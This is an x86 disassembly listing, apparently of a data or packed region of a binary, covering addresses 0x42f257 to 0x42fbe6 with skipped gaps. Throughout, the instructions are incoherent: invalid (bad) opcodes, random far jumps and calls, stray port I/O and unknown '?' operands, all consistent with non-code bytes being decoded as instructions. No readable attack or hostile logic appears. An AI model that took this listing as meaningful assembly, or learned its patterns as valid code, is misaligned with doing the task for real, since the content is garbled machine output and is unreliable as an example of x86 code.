  42f257:	out    dx,al
  42f258:	ror    DWORD PTR [ebp+0x35423c39],cl
  42f25e:	and    BYTE PTR [ebx+0x51a527a8],dl
  42f264:	lea    ebp,[ecx+0x40]
  42f267:	xchg   BYTE PTR [ecx+esi*1],bl
  42f26a:	jmp    0x7aa49510
  42f26f:	dec    esp
  42f270:	call   0xb7074583
  42f275:	jo     0x42f20d
  42f277:	jl     0x42f227
  42f279:	outs   dx,BYTE PTR ds:[esi]
  42f27a:	retf   0xef70
  42f27d:	xchg   ebp,eax
  42f27e:	fadd   QWORD PTR [edi]
  42f280:	mov    edi,0x95898b65
  42f285:	aad    0x8f
  42f287:	push   es
  42f288:	xlat   BYTE PTR ds:[ebx]
  42f289:	fwait
  42f28a:	jge    0x42f236
  42f28c:	fisubr WORD PTR [esi+edx*8-0x56e26502]
  42f293:	repz popf 
  42f295:	dec    ebp
  42f296:	icebp  
  42f297:	sbb    al,0xb5
  42f299:	mov    ds,WORD PTR [edi]
  42f29b:	mov    ebx,0x64158424
  42f2a0:	add    eax,DWORD PTR [esi+0x1830b762]
  42f2a6:	push   esi
  42f2a7:	inc    edi
  42f2a8:	push   0xfffffff1
  42f2aa:	fadd   st,st(2)
  42f2ac:	adc    esi,DWORD PTR [eax+0x3b]
  42f2af:	test   BYTE PTR [edx-0x4597636e],ah
  42f2b5:	rcr    DWORD PTR [edi+0x46],cl
  42f2b8:	dec    eax
  42f2b9:	sub    ebx,ebx
  42f2bb:	scas   eax,DWORD PTR es:[edi]
  42f2bc:	out    0xb0,al
  42f2be:	addr16 icebp 
  42f2c0:	lahf   
  42f2c1:	adc    cl,dh
  42f2c3:	cli    
  42f2c4:	add    eax,ebx
  42f2c6:	mov    dh,0xa5
  42f2c8:	in     al,dx
  42f2c9:	stc    
  42f2ca:	add    BYTE PTR [ecx*2-0x28bc9f04],0xa3
  42f2d2:	repz scas al,BYTE PTR es:[edi]
  42f2d4:	std    
  42f2d5:	clc    
  42f2d6:	adc    DWORD PTR [ecx],eax
  42f2d8:	stos   BYTE PTR es:[edi],al
  42f2d9:	adc    DWORD PTR [edi],0x700aba32
  42f2df:	adc    dh,ch
  42f2e1:	sbb    eax,0xc9c44465
  42f2e6:	addr16 cli 
  42f2e8:	jecxz  0x42f321
  42f2ea:	fcmovbe st,st(2)
  42f2ec:	cmc    
  42f2ed:	fs test al,0xf9
  42f2f0:	in     al,dx
  42f2f1:	inc    esi
  42f2f2:	inc    esp
  42f2f3:	cwde   
  42f2f4:	jne    0x42f284
  42f2f6:	push   edi
  42f2f7:	fstp   TBYTE PTR [edi+0x1858cf8a]
  42f2fd:	nop
  42f2fe:	int    0xba
  42f300:	adc    DWORD PTR [ebx-0x7743d639],edi
  42f306:	push   es
  42f307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f308:	scas   eax,DWORD PTR es:[edi]
  42f309:	fstp   QWORD PTR [edx-0x15]
  42f30c:	push   ebp
  42f30d:	enter  0x6b37,0x9a
	...
  42f371:	add    BYTE PTR [eax],al
  42f373:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	dec    eax
  42f381:	xlat   BYTE PTR ds:[ebx]
  42f382:	add    BYTE PTR [eax+0x1fa8b],dl
  42f388:	add    eax,0xb6000001
  42f38d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f38e:	and    DWORD PTR [edx+0x148e02d7],ebx
  42f394:	lods   al,BYTE PTR ds:[esi]
  42f395:	cmc    
  42f396:	cmp    BYTE PTR ds:0x7179e426,ch
  42f39c:	outs   dx,DWORD PTR ds:[esi]
  42f39d:	mov    ch,0x88
  42f39f:	pusha  
  42f3a0:	jmp    0x42f324
  42f3a2:	mov    ds:0x5ed2ef72,eax
  42f3a7:	int3   
  42f3a8:	jb     0x42f3fb
  42f3aa:	xchg   ebp,eax
  42f3ab:	int    0x44
  42f3ad:	pop    esi
  42f3ae:	cmp    DWORD PTR [edx+0x5e279a11],ecx
  42f3b4:	jno    0x42f37b
  42f3b6:	pusha  
  42f3b7:	repz call FWORD PTR [esi+0x2a]
  42f3bb:	data16 in al,dx
  42f3bd:	inc    eax
  42f3be:	or     BYTE PTR [eax],bh
  42f3c0:	data16 cli 
  42f3c2:	shl    al,cl
  42f3c4:	inc    edx
  42f3c5:	inc    ebp
  42f3c6:	(bad)  
  42f3c7:	shl    BYTE PTR [eax],cl
  42f3c9:	or     al,0x1
  42f3cb:	in     eax,0x85
  42f3cd:	loopne 0x42f41b
  42f3cf:	xchg   esp,eax
  42f3d0:	sbb    BYTE PTR [ecx-0x57],ch
  42f3d3:	dec    edi
  42f3d4:	inc    ecx
  42f3d5:	outs   dx,DWORD PTR ds:[esi]
  42f3d6:	sub    BYTE PTR [esi+esi*8+0x2ba67605],0x25
  42f3de:	pop    ebx
  42f3df:	mov    dl,0x2a
  42f3e1:	sbb    esp,DWORD PTR [edx-0x3464b0fd]
  42f3e7:	push   0xffffff92
  42f3e9:	pop    ebp
  42f3ea:	in     al,dx
  42f3eb:	(bad)
  42f3ee:	mov    dh,bh
  42f3f0:	sbb    edi,0xffffffc5
  42f3f3:	jl     0x42f3e9
  42f3f5:	jmp    0x5d5019a6
  42f3fa:	xor    DWORD PTR [ebx+0x3f9f90b0],esp
  42f400:	xchg   ecx,eax
  42f401:	das    
  42f402:	hlt    
  42f403:	das    
  42f404:	inc    esp
  42f405:	shr    DWORD PTR [edx],1
  42f407:	in     eax,dx
  42f408:	adc    eax,0xfa748213
  42f40d:	fadd   QWORD PTR [ebx-0x27]
  42f410:	or     esp,ebx
  42f412:	and    al,BYTE PTR [esi+ebp*1]
  42f415:	jp     0x42f42f
  42f417:	ret    
  42f418:	in     eax,0xb0
  42f41a:	sbb    dl,BYTE PTR ds:0xbed045db
  42f420:	sub    ch,BYTE PTR [esi+0x13513982]
  42f426:	popf   
  42f427:	pop    edx
  42f428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f429:	pop    eax
  42f42a:	in     eax,dx
  42f42b:	mov    ?,WORD PTR [edi+0x4d14276e]
  42f431:	jle    0x42f47d
  42f433:	data16 repz sbb BYTE PTR [esi+0x5f],cl
  42f438:	and    al,0x90
  42f43a:	(bad)  
  42f43b:	mov    edi,DWORD PTR [esi]
  42f43d:	adc    ah,BYTE PTR [edx-0x454090b1]
  42f443:	push   ss
  42f444:	leave  
  42f445:	std    
  42f446:	fimul  WORD PTR [edx]
  42f448:	inc    ecx
  42f449:	mov    esp,DWORD PTR [edi+0x0]
  42f44c:	xlat   BYTE PTR ds:[ebx]
  42f44d:	repz xor eax,0xc612b50b
  42f453:	imul   ebp,ebp,0xffffff8b
  42f456:	jnp    0x42f43a
  42f458:	popf   
  42f459:	mov    bh,0xd0
  42f45b:	scas   al,BYTE PTR es:[edi]
  42f45c:	push   ebp
  42f45d:	mov    ebx,0x80ce3c71
  42f462:	xchg   ecx,eax
  42f463:	inc    ecx
  42f464:	test   bl,cl
  42f466:	jb     0x42f4cd
  42f468:	fdivr  st(4),st
  42f46a:	jmp    0x42f3f0
  42f46c:	add    bl,BYTE PTR [ebp+0x5600c1a8]
  42f472:	out    0x6,eax
  42f474:	mov    DWORD PTR [ecx-0x28c6eaf1],ebx
  42f47a:	xor    BYTE PTR [ebp+0x39],bh
  42f47d:	xor    BYTE PTR [ebx+eiz*8+0x1e],0x28
  42f482:	xchg   ebp,eax
  42f483:	fs std 
  42f485:	cmp    BYTE PTR [eax],al
  42f487:	std    
  42f488:	mov    ecx,ecx
  42f48a:	pushf  
  42f48b:	retf   0x92fe
  42f48e:	(bad)  
  42f48f:	pushf  
  42f490:	mov    WORD PTR [eax],es
	...
  42f4f2:	add    BYTE PTR [eax],al
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	push   ecx
  42f501:	(bad)  
  42f502:	(bad)  
  42f503:	not    BYTE PTR [eax+0x50001fb]
  42f509:	add    DWORD PTR [eax],eax
  42f50b:	add    bl,bl
  42f50d:	pop    ebx
  42f50e:	loope  0x42f51a
  42f510:	dec    esi
  42f511:	cmp    al,0xae
  42f513:	push   eax
  42f514:	xchg   edi,eax
  42f515:	daa    
  42f516:	pop    edi
  42f517:	je     0x42f52d
  42f519:	jl     0x42f4ca
  42f51b:	adc    DWORD PTR [esi+0x42],eax
  42f51e:	mov    eax,?
  42f520:	mov    ebp,0x210eb07e
  42f525:	jp     0x42f531
  42f527:	mov    esp,0x52ceb544
  42f52c:	bound  ecx,QWORD PTR [edx]
  42f52e:	mov    ds:0xb967ce4a,al
  42f533:	pop    ecx
  42f534:	out    dx,eax
  42f535:	pop    esp
  42f536:	dec    esi
  42f537:	mov    esp,0xb59de716
  42f53c:	xor    esp,DWORD PTR [ecx]
  42f53e:	adc    esp,DWORD PTR [ebx]
  42f540:	mov    ecx,0xba8b98fb
  42f545:	(bad)  [ebp-0x545d0e51]
  42f54b:	xor    al,0xa5
  42f54d:	fadd   DWORD PTR ds:0x63706490
  42f553:	and    ch,ch
  42f555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f556:	lahf   
  42f557:	dec    edx
  42f558:	cmp    bl,bl
  42f55a:	lods   al,BYTE PTR ds:[esi]
  42f55b:	fwait
  42f55c:	adc    BYTE PTR [edx+0x7d],0xa0
  42f560:	or     ecx,DWORD PTR [edi+0x23b7270f]
  42f566:	es add edx,edi
  42f569:	lds    ecx,FWORD PTR [ebx]
  42f56b:	iret   
  42f56c:	and    ecx,ebx
  42f56e:	mov    bh,0x7
  42f570:	mov    esi,0x9283dd55
  42f575:	pop    edx
  42f576:	mov    dh,0xc6
  42f578:	ins    BYTE PTR es:[edi],dx
  42f579:	jmp    0x42f5e8
  42f57b:	jns    0x42f543
  42f57d:	call   0x86936fa2
  42f582:	arpl   WORD PTR [esi-0x6b],di
  42f585:	and    ecx,ebx
  42f587:	(bad)  [ebx]
  42f589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f58a:	add    esi,DWORD PTR [ecx+eax*4+0x14d110df]
  42f591:	push   edi
  42f592:	fidiv  WORD PTR [edx]
  42f594:	fidivr DWORD PTR [edi+eiz*4-0x5dc995e1]
  42f59b:	loop   0x42f559
  42f59d:	jno    0x42f5ff
  42f59f:	dec    esp
  42f5a0:	mov    ds:0xae573310,al
  42f5a5:	jns    0x42f60d
  42f5a7:	mov    gs,WORD PTR [eax]
  42f5a9:	idiv   DWORD PTR [ecx-0x205de048]
  42f5af:	test   BYTE PTR [ebx-0x79],0x23
  42f5b3:	xchg   edi,eax
  42f5b4:	cmp    al,bh
  42f5b6:	in     al,dx
  42f5b7:	ret    
  42f5b8:	cli    
  42f5b9:	ret    0x3523
  42f5bc:	xchg   DWORD PTR ds:0x3780e25d,eax
  42f5c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f5c3:	adc    BYTE PTR [ebx+0xd9b45aa],0xe1
  42f5ca:	jo     0x42f603
  42f5cc:	xchg   DWORD PTR [esi+0x3459bb73],edx
  42f5d2:	dec    ebp
  42f5d3:	std    
  42f5d4:	cmp    al,0xb0
  42f5d6:	test   al,0x99
  42f5d8:	inc    ebp
  42f5d9:	push   ecx
  42f5da:	sbb    eax,0xb37be15e
  42f5df:	in     al,dx
  42f5e0:	loopne 0x42f614
  42f5e2:	fs jp  0x42f57c
  42f5e5:	lods   eax,DWORD PTR ds:[esi]
  42f5e6:	fcomp  DWORD PTR [ecx+0x50def9b8]
  42f5ec:	mov    esi,0x6521fe32
  42f5f1:	cmp    bh,BYTE PTR [ecx-0x7]
  42f5f4:	inc    edx
  42f5f5:	sti    
  42f5f6:	ins    DWORD PTR es:[edi],dx
  42f5f7:	loop   0x42f60c
  42f5f9:	pop    ebp
  42f5fa:	jmp    FWORD PTR [edx]
  42f5fc:	jmp    0xcf71:0xcda5058e
  42f603:	jae    0x42f5a6
  42f605:	(bad)  
  42f606:	cmp    al,0x8f
  42f608:	je     0x42f60c
  42f60a:	inc    edi
  42f60b:	jne    0x42f684
  42f60d:	cdq    
  42f60e:	ds jg  0x42f637
	...
  42f671:	add    BYTE PTR [eax],al
  42f673:	add    BYTE PTR [esi],bh
  42f675:	push   esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	arpl   WORD PTR [ebx+0x6f],di
  42f683:	jg     0x42f61a
  42f685:	cld    
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    eax,0x19000001
  42f68d:	jecxz  0x42f6e6
  42f68f:	add    eax,0xda6f6352
  42f694:	sub    esp,DWORD PTR [ebx+0x245ccf58]
  42f69a:	rcr    BYTE PTR [ebp+ecx*1+0x56],1
  42f69e:	sbb    al,0x9a
  42f6a0:	repnz mov ds:0x27b5c55a,eax
  42f6a6:	aas    
  42f6a7:	adc    BYTE PTR gs:[edx],al
  42f6aa:	jp     0x42f6ee
  42f6ac:	push   0xd
  42f6ae:	mov    esi,0xbdd3a8bd
  42f6b3:	inc    edi
  42f6b4:	in     eax,dx
  42f6b5:	push   esi
  42f6b6:	push   ebx
  42f6b7:	jnp    0x42f71a
  42f6b9:	mov    ebx,0x88d48016
  42f6be:	sub    bl,BYTE PTR [ebx+0x16ec76a8]
  42f6c4:	idiv   edi
  42f6c6:	fcomp  DWORD PTR [edx+0x4b]
  42f6c9:	xchg   ebp,eax
  42f6ca:	mov    dh,BYTE PTR [edx-0x38]
  42f6cd:	pop    esp
  42f6ce:	xchg   ecx,eax
  42f6cf:	arpl   WORD PTR [ebp+0x1ae47d74],bp
  42f6d5:	jl     0x42f6ed
  42f6d7:	xchg   DWORD PTR [eax+ebp*2],ebx
  42f6da:	lds    esi,FWORD PTR [edx-0x16]
  42f6dd:	mov    edi,0x87c45688
  42f6e2:	dec    ebp
  42f6e3:	mov    dh,0x4f
  42f6e5:	ja     0x42f678
  42f6e7:	or     dh,BYTE PTR ds:0xd3511b2a
  42f6ed:	fwait
  42f6ee:	and    ebx,DWORD PTR es:[eax-0x4eace7eb]
  42f6f5:	and    bh,bl
  42f6f7:	gs push 0x45
  42f6fa:	sub    ch,BYTE PTR [edi-0x73]
  42f6fd:	jmp    0x42f74d
  42f6ff:	xlat   BYTE PTR ds:[ebx]
  42f700:	dec    eax
  42f701:	xchg   ebp,eax
  42f702:	lahf   
  42f703:	push   es
  42f704:	push   0x2
  42f706:	add    bh,BYTE PTR [esi-0x7b34599d]
  42f70c:	push   ebp
  42f70d:	stos   BYTE PTR es:[edi],al
  42f70e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f70f:	push   edi
  42f710:	xchg   ecx,eax
  42f711:	push   ss
  42f712:	or     DWORD PTR [ebp-0x1494bb8c],ecx
  42f718:	repnz mov ebp,0x388150c5
  42f71e:	ret    0x34b7
  42f721:	xchg   esi,eax
  42f722:	fnstcw WORD PTR [edx+0x7695946]
  42f728:	fadd   DWORD PTR [ebx+0x59bd3efb]
  42f72e:	push   es
  42f72f:	sbb    eax,0x2dad0151
  42f734:	xchg   edi,eax
  42f735:	xor    eax,eax
  42f737:	xchg   esi,eax
  42f738:	sub    ch,BYTE PTR [esp+0x56e63661]
  42f73f:	ret    0x27c6
  42f742:	cmp    bl,BYTE PTR [ecx+0x27c0ae69]
  42f748:	fdivp  st(6),st
  42f74a:	outs   dx,DWORD PTR ds:[esi]
  42f74b:	hlt    
  42f74c:	sbb    al,0x26
  42f74e:	enter  0x249b,0x93
  42f752:	cmp    eax,0x77bc3712
  42f757:	ret    0x8dce
  42f75a:	ja     0x42f736
  42f75c:	arpl   cx,ax
  42f75e:	fld    st(1)
  42f760:	add    DWORD PTR [ebx-0x2e],esi
  42f763:	and    eax,DWORD PTR [ecx+0x14]
  42f766:	mov    eax,ds:0x6da3d3d7
  42f76b:	das    
  42f76c:	jg     0x42f757
  42f76e:	out    dx,eax
  42f76f:	aad    0x49
  42f771:	xor    eax,0xb373334
  42f776:	mov    ecx,0xf5ec786f
  42f77b:	push   es
  42f77c:	and    al,0xed
  42f77e:	ds xor al,0x1b
  42f781:	test   DWORD PTR [ecx],ebx
  42f783:	fist   WORD PTR [ebx+0x19]
  42f786:	mov    ah,0x30
  42f788:	jmp    0xf396:0x39f22e19
  42f78f:	inc    esi
  42f790:	dec    eax
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x197fb075
  42f804:	call   0x1:0x50001fd
  42f80b:	add    bh,ah
  42f80d:	icebp  
  42f80e:	or     DWORD PTR [edi+0x72],ebx
  42f811:	add    dh,dl
  42f813:	sub    eax,DWORD PTR [edx+0x51]
  42f816:	mov    BYTE PTR [edx+0x1a],dh
  42f819:	adc    al,0xad
  42f81b:	out    dx,eax
  42f81c:	jle    0x42f85b
  42f81e:	jl     0x42f7bb
  42f820:	lahf   
  42f821:	push   edi
  42f822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f823:	pop    esi
  42f824:	lahf   
  42f825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f826:	test   eax,0x85eb165d
  42f82b:	sub    al,0x76
  42f82d:	sti    
  42f82e:	(bad)
  42f832:	test   al,0xc1
  42f834:	lea    ebp,[ecx+0x57]
  42f837:	dec    edi
  42f838:	out    0xd8,al
  42f83a:	and    edi,DWORD PTR [ebx-0x7ebc1672]
  42f840:	jbe    0x42f80f
  42f842:	cs std 
  42f844:	shl    BYTE PTR [esi-0x7e],cl
  42f847:	sti    
  42f848:	mov    ds,WORD PTR [edx+0x7c]
  42f84b:	inc    eax
  42f84c:	xchg   edx,eax
  42f84d:	jo     0x42f84e
  42f84f:	and    dh,BYTE PTR [ebp-0x12903723]
  42f855:	xchg   BYTE PTR [edi],al
  42f857:	pop    es
  42f858:	cmp    esi,esp
  42f85a:	clc    
  42f85b:	mov    edx,0x3e1d94c8
  42f860:	dec    esi
  42f861:	bound  edx,QWORD PTR [eax+0xd]
  42f864:	pop    eax
  42f865:	push   esi
  42f866:	lahf   
  42f867:	xchg   ebx,eax
  42f868:	adc    DWORD PTR [edi-0x3d],0xffffffed
  42f86c:	jecxz  0x42f8b6
  42f86e:	les    edi,FWORD PTR [eax+0x74]
  42f871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f872:	enter  0xdde5,0xe9
  42f876:	int3   
  42f877:	test   edi,edi
  42f879:	inc    eax
  42f87a:	cmp    BYTE PTR [edx],ch
  42f87c:	jmp    0x6396:0x6368bdd2
  42f883:	push   esp
  42f884:	sub    esi,DWORD PTR [eax]
  42f886:	mov    edi,0x586f5e73
  42f88b:	aam    0xe9
  42f88d:	imul   eax,DWORD PTR [ebp+0x50],0x71
  42f891:	jmp    0xf3ca9537
  42f896:	sub    esi,ebx
  42f898:	mov    ebx,0xed9ef618
  42f89d:	sub    al,0xd
  42f89f:	pop    ebp
  42f8a0:	bnd jne 0x42f900
  42f8a3:	jle    0x42f838
  42f8a5:	cs or  ebp,esp
  42f8a8:	fidiv  WORD PTR ds:0x8c5b6a78
  42f8ae:	dec    esi
  42f8af:	jp     0x42f890
  42f8b1:	pop    ax
  42f8b3:	mov    eax,ds:0xdb2d5a1b
  42f8b8:	and    ecx,esi
  42f8ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f8bb:	out    0xe4,al
  42f8bd:	cmp    BYTE PTR [ecx+0x6ce0bfe],bh
  42f8c3:	cmp    ebp,esp
  42f8c5:	dec    esp
  42f8c6:	mov    WORD PTR [ebx-0x3b],fs
  42f8c9:	inc    eax
  42f8ca:	mov    eax,ds:0x688ca404
  42f8cf:	jae    0x42f878
  42f8d1:	xor    BYTE PTR [esi],0xf7
  42f8d4:	aas    
  42f8d5:	jbe    0x42f8b6
  42f8d7:	lods   al,BYTE PTR ds:[esi]
  42f8d8:	ret    
  42f8d9:	pop    edi
  42f8da:	fs dec esp
  42f8dc:	pop    edx
  42f8dd:	dec    ecx
  42f8de:	cmp    DWORD PTR [edx+0x25c874a8],ebx
  42f8e4:	cmp    ebp,DWORD PTR [ecx+esi*2+0x4d]
  42f8e8:	sbb    dh,BYTE PTR [ebx-0x73]
  42f8eb:	pop    ebx
  42f8ec:	jmp    0xe1c5:0x72b98cbb
  42f8f3:	mov    cs,edi
  42f8f5:	mov    ebp,0x18ce8922
  42f8fa:	push   edi
  42f8fb:	sub    ebx,ecx
  42f8fd:	mov    ds:0xc03d3e82,al
  42f902:	pop    ebx
  42f903:	sbb    DWORD PTR [esi-0x7e],eax
  42f906:	xchg   edi,eax
  42f907:	xor    al,0xbe
  42f909:	cwde   
  42f90a:	sbb    al,0xd5
  42f90c:	jmp    0x0:0xd512cb5d
	...
  42f973:	add    BYTE PTR [esp+esi*2],dl
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42fa00
  42f981:	outs   dx,DWORD PTR ds:[esi]
  42f982:	jo     0x42f906
  42f984:	lahf   
  42f985:	inc    BYTE PTR [ecx]
  42f987:	add    BYTE PTR ds:0xd8000001,al
  42f98d:	add    DWORD PTR [ecx+0x33],edi
  42f990:	test   al,0x21
  42f992:	inc    esi
  42f993:	(bad)  [ecx+0x53]
  42f996:	jp     0x42f9a4
  42f998:	aaa    
  42f999:	inc    esi
  42f99a:	mov    ds:0xaf541d64,eax
  42f99f:	in     eax,dx
  42f9a0:	sbb    ebx,DWORD PTR [ebp-0x3]
  42f9a3:	loope  0x42f9bb
  42f9a5:	sbb    eax,0xbf2ebefc
  42f9aa:	(bad)
  42f9ad:	(bad)  
  42f9af:	ror    dl,1
  42f9b1:	jo     0x42f9d6
  42f9b3:	push   ecx
  42f9b4:	add    DWORD PTR [eax+0x28],edi
  42f9b7:	sub    eax,0x47b0c84e
  42f9bc:	adc    eax,0xe19b5323
  42f9c1:	adc    ebp,DWORD PTR [edx-0x60f9fc2d]
  42f9c7:	inc    edx
  42f9c8:	sub    DWORD PTR [ebp+edi*2-0x5],eax
  42f9cc:	sbb    eax,0x944aefee
  42f9d1:	sbb    eax,0x1c1b7c2b
  42f9d6:	jmp    0x121:0xf74e306f
  42f9dd:	mov    cl,0x58
  42f9df:	cmp    WORD PTR [esp],si
  42f9e3:	popa   
  42f9e4:	inc    eax
  42f9e5:	shl    edx,0x6
  42f9e8:	loope  0x42fa39
  42f9ea:	and    BYTE PTR [edi+eiz*1],bh
  42f9ed:	pop    edi
  42f9ee:	and    DWORD PTR [ebp+0x71],esp
  42f9f1:	push   0x40
  42f9f3:	add    eax,0x91d2627f
  42f9f8:	pop    edx
  42f9f9:	pushf  
  42f9fa:	outs   dx,BYTE PTR ds:[esi]
  42f9fb:	stos   DWORD PTR es:[edi],eax
  42f9fc:	dec    ecx
  42f9fd:	(bad)  
  42f9fe:	sahf   
  42f9ff:	sbb    esi,eax
  42fa01:	dec    eax
  42fa02:	mov    ds:0x5843b748,al
  42fa07:	imul   edi,DWORD PTR [edx],0xffffffc9
  42fa0a:	aad    0x98
  42fa0c:	xchg   edi,eax
  42fa0d:	cmp    eax,0x7ffcfa68
  42fa12:	mov    ah,0xa9
  42fa14:	std    
  42fa15:	call   0x9c9:0xa3bacde8
  42fa1c:	and    eax,DWORD PTR [edi-0x17]
  42fa1f:	xchg   ecx,eax
  42fa20:	int    0x85
  42fa22:	sbb    edi,DWORD PTR [ebx+0x65]
  42fa25:	jecxz  0x42f9c4
  42fa27:	jg     0x42fa6b
  42fa29:	xor    esi,DWORD PTR [edi+ebp*4+0x73]
  42fa2d:	test   al,0xc8
  42fa2f:	xchg   edx,eax
  42fa30:	loopne 0x42fa80
  42fa32:	test   DWORD PTR ds:0xfc41cbda,0x88306697
  42fa3c:	mov    WORD PTR [edi+0x26dacf5b],gs
  42fa42:	(bad)  
  42fa44:	or     DWORD PTR [edi+0x4785a0a1],eax
  42fa4a:	inc    edx
  42fa4b:	std    
  42fa4c:	lods   al,BYTE PTR ds:[esi]
  42fa4d:	dec    ecx
  42fa4e:	daa    
  42fa4f:	inc    eax
  42fa50:	rol    BYTE PTR [ebp-0xc],0x91
  42fa54:	and    ebp,DWORD PTR [esi-0x10]
  42fa57:	xor    eax,0x6e7afcf0
  42fa5c:	dec    esp
  42fa5d:	xchg   edx,edi
  42fa5f:	xchg   ebp,eax
  42fa60:	push   ebx
  42fa61:	shl    al,cl
  42fa63:	in     eax,0x46
  42fa65:	or     BYTE PTR [ebx+esi*2-0x4b825826],dl
  42fa6c:	xor    bl,ah
  42fa6e:	mov    WORD PTR [esi],ss
  42fa70:	lea    ebx,[edi-0x36]
  42fa73:	jae    0x42fa35
  42fa75:	rcl    dh,cl
  42fa77:	add    eax,0x18b6a07c
  42fa7c:	push   cs
  42fa7d:	push   ebx
  42fa7e:	adc    al,0xab
  42fa80:	out    0x60,eax
  42fa82:	hlt    
  42fa83:	and    eax,0x893dd958
  42fa88:	dec    edi
  42fa89:	hlt    
  42fa8a:	dec    esp
  42fa8b:	iret   
  42fa8c:	arpl   WORD PTR [ecx],sp
  42fa8e:	(bad)  
  42fa8f:	in     eax,dx
  42fa90:	loop   0x42fa92
	...
  42faf2:	add    BYTE PTR [eax],al
  42faf4:	sbb    ebp,edi
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	or     eax,0xa47bf533
  42fb05:	inc    DWORD PTR [ecx]
  42fb07:	add    BYTE PTR ds:0x66000001,al
  42fb0d:	xor    bl,ah
  42fb0f:	sub    edi,ecx
  42fb11:	mov    bl,0x27
  42fb13:	lahf   
  42fb14:	retf   
  42fb15:	pusha  
  42fb16:	jns    0x42fadd
  42fb18:	je     0x42fb70
  42fb1a:	rcr    DWORD PTR [edi],0xdd
  42fb1d:	and    cl,BYTE PTR [ebp-0x3aaec063]
  42fb23:	pop    ebx
  42fb24:	add    al,0xd
  42fb26:	add    bl,ch
  42fb28:	out    0x17,al
  42fb2a:	xor    BYTE PTR [edx+0x36b3b995],bh
  42fb30:	cmp    eax,0xfd4ce4a3
  42fb35:	xchg   ecx,eax
  42fb36:	push   eax
  42fb37:	mov    eax,0xc529e1c2
  42fb3c:	(bad)  
  42fb3d:	aam    0x5
  42fb3f:	subps  xmm0,XMMWORD PTR [edx-0x1d665fa0]
  42fb46:	push   ss
  42fb47:	pop    ds
  42fb48:	cmp    BYTE PTR [ebx],0xa2
  42fb4b:	pop    ss
  42fb4c:	sbb    ah,bh
  42fb4e:	pop    ebp
  42fb4f:	mov    ah,dl
  42fb51:	mov    ds:0x70c8c61c,al
  42fb56:	lods   al,BYTE PTR cs:[esi]
  42fb58:	outs   dx,DWORD PTR ds:[esi]
  42fb59:	mov    DWORD PTR [ebx-0x5c],esp
  42fb5c:	push   ebx
  42fb5d:	pop    ebp
  42fb5e:	add    bl,cl
  42fb60:	in     eax,0xf3
  42fb62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb63:	sbb    BYTE PTR [ebp-0xf55540],bl
  42fb69:	xchg   ebx,eax
  42fb6a:	call   0xe6f0:0x9be9027a
  42fb71:	(bad)  
  42fb73:	(bad)  
  42fb74:	cli    
  42fb75:	dec    ecx
  42fb76:	addr16 hlt 
  42fb78:	xchg   esp,eax
  42fb79:	jno    0x42fbbd
  42fb7b:	pop    ss
  42fb7c:	sbb    BYTE PTR [ebp-0x59],dh
  42fb7f:	add    eax,0x8172dd5b
  42fb84:	fld    QWORD PTR [esi+0x54a68628]
  42fb8a:	pop    ecx
  42fb8b:	dec    eax
  42fb8c:	test   eax,0x3738959b
  42fb91:	push   ss
  42fb92:	push   ebp
  42fb93:	xlat   BYTE PTR ds:[ebx]
  42fb94:	in     eax,dx
  42fb95:	mov    ebp,0xd89fc14f
  42fb9a:	push   ds
  42fb9b:	lds    ebx,FWORD PTR [ecx-0x26]
  42fb9e:	or     eax,DWORD PTR [ebx+0xc]
  42fba1:	push   0x5b64292f
  42fba6:	les    edi,FWORD PTR [edx]
  42fba8:	sub    eax,0xc59a7c60
  42fbad:	xchg   esi,eax
  42fbae:	xchg   esi,eax
  42fbaf:	ins    DWORD PTR es:[edi],dx
  42fbb0:	jp     0x42fb59
  42fbb2:	repnz and eax,0xd04f6269
  42fbb8:	add    al,0xcd
  42fbba:	sbb    BYTE PTR [edi],ah
  42fbbc:	or     esp,edx
  42fbbe:	mov    ecx,0x5774af09
  42fbc3:	lds    ecx,FWORD PTR [esi-0x17]
  42fbc6:	outs   dx,BYTE PTR ds:[esi]
  42fbc7:	mov    ds:0x7bfa4d8,eax
  42fbcc:	js     0x42fbcf
  42fbce:	retf   
  42fbcf:	mov    al,ds:0x508c084a
  42fbd4:	adc    al,0x6e
  42fbd6:	arpl   sp,ax
  42fbd8:	test   DWORD PTR [ebx-0x744384ea],esi
  42fbde:	push   ebp
  42fbdf:	xor    BYTE PTR [ebp-0x39],al
  42fbe2:	xchg   ebx,eax
  42fbe3:	clc    
  42fbe4:	ja     0x42fbab
  42fbe6:	ja     0x42fbde
